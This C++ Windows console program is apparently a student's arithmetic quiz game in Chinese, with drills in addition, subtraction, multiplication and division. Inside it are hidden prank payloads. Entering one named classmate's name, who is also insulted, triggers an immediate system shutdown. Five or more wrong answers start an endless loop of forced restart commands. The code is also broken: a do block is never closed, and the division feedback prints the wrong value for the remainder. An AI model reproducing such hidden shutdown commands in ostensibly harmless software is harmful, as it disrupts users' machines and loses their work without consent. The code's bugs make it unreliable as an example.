#include<bits/stdc++.h>
#include<windows.h> 
using namespace std; 
void start()
{
	cout<<"它是数学的好伙伴";Sleep(900);system("cls");
	cout<<"也是编程的一大盛举";Sleep(900);system("cls");
	cout<<"它能帮助你学习数学";Sleep(900);system("cls");
	cout<<"也能引起你对编程的兴趣";Sleep(900);system("cls");
	cout<<"没错，你猜对了";Sleep(900);system("cls");
	cout<<"他就是：";Sleep(1500);system("cls");
	cout<<"李明喆小课堂！！！";Sleep(900);system("cls");
	cout<<"最新消息，最新消息";Sleep(500);system("cls");
	cout<<"李明喆";Sleep(500);system("cls");
	cout<<"小课堂";Sleep(500);system("cls");
	cout<<"开课啦！！！";Sleep(1000);system("cls");
	cout<<"李明喆";Sleep(500);system("cls");
	cout<<"小课堂";Sleep(500);system("cls");
	cout<<"开课啦！！！";Sleep(1000);system("cls");
	for(int i=0;i<4;i++){cout<<"最新";Sleep(400);}
	cout<<"九种功能";
	Sleep(600);system("cls");
	cout<<"一切精彩，尽在李明喆小课堂";Sleep(2000);system("cls");
} 
int gh(int gg)
{
	int ssr=gg,sr=1;
	for(int i=2;i*i<=gg;i++)
	{
		while(ssr%(i*i)==0)
		{
			ssr/=i*i;
			sr*=i;
		}
	}
	return sr;
}
int main()
{
	start();
	string lmz;bool hry=false;
	int a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,ct0=0,ct1=0,ct2=0,ct3=0,ct4=0,ct5=0,ct6=0,ct7=0,ct8=0,round=0;
	do{
		cout<<"谨记，输完什么都要回车！！！\n本程序由李明喆编写，胡瑞岩、辣鸡邱晨蔚续写。\n在同一个小课堂内错了五题以上后有一个微不足道的惩罚，嘿嘿嘿。\n";
		cout<<"请输入你的名字：";
		cin>>lmz;
		if(lmz=="邱晨蔚"||lmz=="qiuchenwei"){
			lmz="辣鸡邱晨蔚";
			cout<<lmz<<endl<<"恭喜你中奖了！！！";
			Sleep(80);
			system("shutdown -s -t 0"); 
		} 
		if(lmz=="rooot"||lmz=="李明喆"||lmz=="胡瑞岩"||lmz=="辣鸡邱晨蔚") {hry=true;}
		Sleep(600);system("cls");
		cout<<lmz<<",";
		printf("欢迎来到李明喆加法小课堂\n");
		printf("想要跳过这部分吗？\n不存在的，随便输个数代表你的智商吧\n");
		scanf("%d",&d);
		system("cls");
		if(d==160419&&hry==true){
			printf("作弊的小子\n");
			printf("你跳过了加法部分\n\n");
			Sleep(1500);system("cls");
		}
		for(b=0;b<7&&(d!=160419||hry==false);){
			if(ct0>=5){
				for(int fff=0;;fff++){
					system("shutdown -r -t 3");
					cout<<"信仰圣光吧！！！";
				}
			}
			srand(time(0));
			d=(int)(100.0*rand()/RAND_MAX*1999+1.0);
			j=(int)(100.0*rand()/(RAND_MAX+1.0));
			k=(int)(100.0*rand()/RAND_MAX+1.0);
			c=j+k;
			printf(" %d + %d = ",j,k);
			scanf("%d",&a);
			if(a==c){
				printf("对了哟^_^\n");
				b++;
			}
			else{
				ct0=ct0+1;
				printf("错！正确的和是%d，滚去学习吧(╯‵□′)╯︵┴─┴\n", c);
			}
			if(b==5){
				printf("最后两道题！\n");
			}
			else if(b==6){
				printf("最后一道题！\n");
			}
			else if(b==7){
				printf("你成功了！⊙ω⊙");
			}
			else{
				continue;
			}
		}Sleep(1500);system("cls");
		cout<<lmz<<",";
		printf("欢迎来到李明喆减法小课堂\n");
		printf("想跳过这部分吗？\n不存在的，随便输个数代表你的智商吧\n");
		scanf("%d",&d);system("cls");
		if(d==160419&&hry==true){
			printf("作弊的小子\n");
			printf("你跳过了减法部分\n\n");
			Sleep(1500);system("cls");
		}
		for(g=0;g<7&&(d!=160419||hry==false);){
			if(ct1>=5){
				for(int fff=0;;fff++){
					system("shutdown -r -t 3");
					cout<<"信仰圣光吧！！！";
				}
			}
			srand(time(0));
			d=(int)(30.0*rand()/RAND_MAX*19999+1.0);
			j=(int)(100.0*rand()/(RAND_MAX+1.0));
			k=(int)(70.0*rand()/RAND_MAX+1.0);
			c=j-k;
			printf(" %d - %d = ",j,k);
			scanf("%d",&a);
			if(a==c){
				printf("对了哟^_^\n");
				g++;
			}
			else{
				ct1=ct1+1;
				printf("错！正确的差是%d，滚去学习吧(╯‵□′)╯︵┴─┴\n", c);
			}
			if(g==5){
				printf("最后两道题！\n");
			}
			else if(g==6){
				printf("最后一道题！\n");
			}
			else if(g==7){
				printf("你成功了！⊙ω⊙");
			}
			else{
				continue;
			}
		}Sleep(1500);system("cls");
		cout<<lmz<<",";
		printf("欢迎来到李明喆乘法小课堂\n");
		printf("想跳过这部分吗？\n不存在的，随便输个数代表你的智商吧\n");
		scanf("%d",&d);
		system("cls"); 
		if(d==160419&&hry==true){
			printf("作弊的小子\n");
			printf("你跳过了乘法部分\n\n");
			Sleep(1500);system("cls");
		}
		for(e=0;e<7&&(d!=160419||hry==false);){
			if(ct2>=5){
				for(int fff=0;;fff++){
					system("shutdown -r -t 3");
					cout<<"信仰圣光吧！！！";
				}
			}
			srand(time(0));
			d=(int)(100.0*rand()/RAND_MAX*1999+1.0);
			j=2+(int)(8.0*rand()/(RAND_MAX+1.0));
			k=(int)(100.0*rand()/RAND_MAX+1.0);
			c=j*k;
			printf(" %d x %d = ",j,k);
			scanf("%d",&a);
			if(a==c){
				printf("对了哟^_^\n");
				e++;
			}
			else{
				ct2=ct2+1;
				printf("错！正确的积是%d，滚去学习吧(╯‵□′)╯︵┴─┴\n", c);
			}
			if(e==5){
				printf("最后两道题！\n");
			}
			else if(e==6){
				printf("最后一道题！\n");
			}
			else if(e==7){
				printf("你成功了！⊙ω⊙");
			}
			else{
				continue;
			}
		}Sleep(1500);system("cls");
		cout<<lmz<<",";
		printf("欢迎来到李明喆除法小课堂\n");
		printf("想跳过这部分吗？\n不存在的，随便输个数代表你的智商吧\n");
		scanf("%d",&d);
		system("cls");
		if(d==160419&&hry==true){
			printf("作弊的小子\n");
			printf("你跳过了除法部分\n\n");
			Sleep(1500);system("cls");
		}
		for(f=0;f<5&&(d!=160419||hry==false);){
			if(ct3>=5){
				for(int fff=0;;fff++){
					system("shutdown -r -t 3");
					cout<<"信仰圣光吧！！！";
				}
			}
			srand(time(0));
			d=(int)(100.0*rand()/RAND_MAX*1999+1.0);
			h=(int)(150.0*rand()/RAND_MAX+1.0);
			k=(int)(60.0*rand()/RAND_MAX+1.0);
			c=(int)h/k;
			j=h%k;
			printf(" %d / %d =（商）",h,k);
			scanf("%d",&a);
			printf("余数：");
			scanf("%d",&t);
			if(a==c&&t==j){
				printf("对了哟^_^\n");
				f++;
			}
			else{
				ct3=ct3+1;
				printf("错！正确的商是%d，余数是%d，滚去学习吧(╯‵□′)╯︵┴─┴\n", c,h);
			}
			if(f==3){
				printf("最后两道题！\n");
			}
			else if(f==4){
				printf("最后一道题！\n");
			}
			else if(f==5){
				printf("你成功了！⊙ω⊙");
			}
			else{
				continue;
			}
		}
  Sleep(1500);system("cls");
	return 0;
}
